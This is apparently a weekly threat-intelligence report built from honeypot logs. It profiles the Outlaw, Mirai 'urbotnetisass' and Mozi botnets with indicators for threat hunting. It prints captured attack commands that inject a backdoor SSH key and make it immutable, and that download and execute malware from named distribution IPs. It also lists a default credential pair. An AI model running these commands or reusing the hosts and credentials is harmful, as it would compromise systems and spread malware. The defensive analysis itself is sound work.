**Report Generation Time:** 2025-10-25T10:00:00Z
**Timeframe:** October 18, 2025 - October 25, 2025
**Files Used:** This report was generated by analyzing and aggregating data from all `Honeypot_Attack_Summary_Report_*.md` files provided for the specified timeframe.

## 1. Executive Summary

This report provides a comprehensive analysis of botnet activities observed across our global honeypot network over the past week. The threat landscape was dominated by several large-scale, automated campaigns, each with distinct tactics, techniques, and procedures (TTPs) and objectives. The primary goals of these campaigns were botnet propagation for Distributed Denial-of-Service (DDoS) attacks and establishing persistent backdoors for future exploitation, such as deploying cryptocurrency miners.

Three major, concurrent botnet campaigns were identified, distinguished by their unique malware and signatures:

1.  **The "Outlaw" Group Campaign:** This financially motivated group continues its widespread campaign to gain persistent access to Linux servers. Their activity is easily identified by a unique SSH key signature (`mdrfckr`) and a specific set of commands designed to make their backdoor immutable.

2.  **Mirai Variant "urbotnetisass":** A massive campaign was observed targeting IoT and embedded devices with the "urbotnetisass" malware, a known variant of the Mirai botnet. Attackers systematically downloaded payloads for various architectures (ARM, MIPS, x86) with the clear objective of enslaving devices for DDoS attacks.

3.  **Mozi P2P Botnet:** The resilient Mozi botnet was also actively spreading, identified by the download of its specific malware payloads (`Mozi.m`, `Mozi.a+varcron`). This campaign targets IoT devices with weak Telnet credentials and known vulnerabilities, leveraging its decentralized P2P architecture to resist takedowns.

This report will provide a detailed breakdown of each botnet's observed activity, including specific Indicators of Compromise (IOCs) such as commands, SSH keys, IP addresses, and malware filenames for use in manual verification and threat hunting.

## 2. Detailed Botnet Activity Analysis

This section details the specific activities of each identified botnet threat actor based on the provided logs and OSINT analysis.

### 2.1. The "Outlaw" Group (Persistence & Cryptomining)

The Outlaw group (also known as "Dota") was responsible for a significant number of successful SSH compromises. Their TTPs are highly consistent and serve their primary goal of establishing long-term persistence for cryptomining operations.

**Objective:**
To maintain permanent, passwordless access to compromised servers to deploy and run cryptocurrency miners.

**Key Indicators & TTPs:**

*   **Initial Access:** Brute-forcing weak or default SSH credentials.
*   **Persistence Tactic:** The most reliable indicator of the Outlaw group is their post-exploitation command, which wipes the existing SSH configuration and installs their own key.
*   **Attacker Signature:** The injected SSH key contains the unique and explicit comment **"mdrfckr"**.

**Captured Data for Verification:**

*   **SSH Public Key:**
    ```
    ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
    ```
*   **Associated Commands:**
    ```bash
    # Command to delete old SSH config and inject the new key
    cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3... mdrfckr" >> .ssh/authorized_keys

    # Commands to make the new SSH key immutable
    cd ~; chattr -ia .ssh; lockr -ia .ssh
    lockr -ia .ssh
    ```
    *OSINT confirms that `lockr` is a non-standard command used by this actor, likely a custom tool or script that leverages `chattr` to make the backdoor persistent and difficult to remove.*

### 2.2. Mirai Botnet Variant ("urbotnetisass")

This campaign represents a classic IoT botnet propagation effort. The primary goal is to infect as many vulnerable embedded devices as possible to build a powerful DDoS weapon.

**Objective:**
To infect IoT devices (routers, cameras, DVRs) and add them to a botnet for launching DDoS attacks.

**Key Indicators & TTPs:**

*   **Initial Access:** Exploiting command injection vulnerabilities and weak/default Telnet/SSH credentials on IoT devices.
*   **Payload Staging:** Using world-writable directories like `/data/local/tmp/` or `/tmp/` to download malware.
*   **Multi-Architecture Payload:** Downloading specific ELF binaries compiled for a wide range of IoT CPU architectures.

**Captured Data for Verification:**

*   **Malware Filenames:**
    *   `arm.urbotnetisass`
    *   `arm5.urbotnetisass`
    *   `arm6.urbotnetisass`
    *   `arm7.urbotnetisass`
    *   `mips.urbotnetisass`
    *   `mipsel.urbotnetisass`
    *   `x86_32.urbotnetisass`
*   **Associated Commands:**
    ```bash
    # Typical command to download and execute the malware on an Android/embedded device
    cd /data/local/tmp/; rm *; busybox wget http://[C2_IP]/bins/arm.urbotnetisass; chmod 777 arm.urbotnetisass; ./arm.urbotnetisass

    # Generic downloader script execution from a known malware host
    cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh
    ```
*   **Known C2/Distribution Server:**
    *   `94.154.35.154`
    *   `213.209.143.62`

### 2.3. Mozi P2P Botnet

The Mozi botnet was identified by the download of its specific malware payloads. It is known for its resilient P2P architecture, making it difficult to disrupt.

**Objective:**
To infect IoT devices for use in DDoS attacks, data exfiltration, and remote command execution.

**Key Indicators & TTPs:**

*   **Architecture:** Utilizes a Distributed Sloppy Hash Table (DHT) for a decentralized P2P command structure.
*   **Initial Access:** Primarily targets weak Telnet passwords and a known list of IoT vulnerabilities.

**Captured Data for Verification:**

*   **Malware Filenames:**
    *   `Mozi.m`
    *   `Mozi.a+varcron`

## 3. General Indicators and Shared TTPs

Across all campaigns, several common TTPs were observed, indicating a shared playbook among automated botnet tools.

*   **System Reconnaissance:** Nearly all successful compromises were immediately followed by a standard set of reconnaissance commands to fingerprint the system:
    ```bash
    uname -a
    whoami
    lscpu
    cat /proc/cpuinfo | grep name | wc -l
    free -m
    df -h
    crontab -l
    ```
*   **Malware "Cockroaching" (Competition):** Some malicious scripts contained commands designed to find and kill the processes of competing malware, ensuring their bot is the only one utilizing the compromised device's resources.
    ```bash
    rm -rf /tmp/secure.sh; pkill -9 secure.sh;
    ```
*   **Targeted Default Credentials:** Attackers consistently used the credential pair `345gs5662d34` / `345gs5662d34`. OSINT has previously linked this to default credentials for specific models of Polycom IP telephones, indicating a specific sub-campaign to compromise VoIP equipment.
*   **SMB Worm Activity:** A high volume of alerts for the **DoublePulsar backdoor** indicates that automated worms are still actively scanning for and exploiting the EternalBlue (MS17-010) vulnerability to propagate.
